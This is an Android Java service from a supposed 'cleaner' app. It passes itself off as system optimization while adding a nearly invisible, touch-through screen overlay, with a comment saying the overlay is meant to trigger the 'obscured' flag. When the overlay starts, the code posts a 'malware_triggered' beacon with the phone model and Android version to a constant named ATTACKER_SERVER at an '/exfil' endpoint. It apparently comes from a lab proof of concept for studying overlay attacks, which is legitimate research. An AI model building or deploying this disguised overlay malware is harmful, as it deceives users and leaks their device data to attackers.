package com.example.cleanerapp;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class OverlayService extends Service {

    private static final String TAG = "CleanerApp";
    private static final String ATTACKER_SERVER = "http://10.0.2.2:8080/exfil";

    private WindowManager windowManager;
    private View overlayView;
    private OkHttpClient httpClient;

    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "OverlayService started");

        String channelId = "overlay_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Overlay Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("Device Cleaner")
                .setContentText("System optimization active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else {
            startForeground(1, notification);
        }

        httpClient = new OkHttpClient();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        overlayView = new View(this);
        overlayView.setBackgroundColor(Color.TRANSPARENT);

        int layoutType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                250, // Height covering the bottom area
                layoutType,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.BOTTOM;
        params.alpha = 0.01f; // Invisible but still triggers obscured flag

        try {
            windowManager.addView(overlayView, params);
            Log.d(TAG, "[OVERLAY_ACTIVE] Stealth invisible overlay enabled");
            reportMalwareStatus();
        } catch (Exception e) {
            Log.e(TAG, "[OVERLAY_ERROR] " + e.getMessage());
        }

        return START_STICKY;
    }

    private void reportMalwareStatus() {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("malware_triggered", true);
                payload.put("phone_model", Build.MODEL);
                payload.put("android_version", Build.VERSION.RELEASE);
                
                RequestBody body = RequestBody.create(payload.toString(), MediaType.parse("application/json"));
                Request request = new Request.Builder().url(ATTACKER_SERVER).post(body).header("Connection", "close").build();
                try (Response response = httpClient.newCall(request).execute()) {}
            } catch (Exception ignored) {}
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (overlayView != null && windowManager != null) {
            windowManager.removeView(overlayView);
        }
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}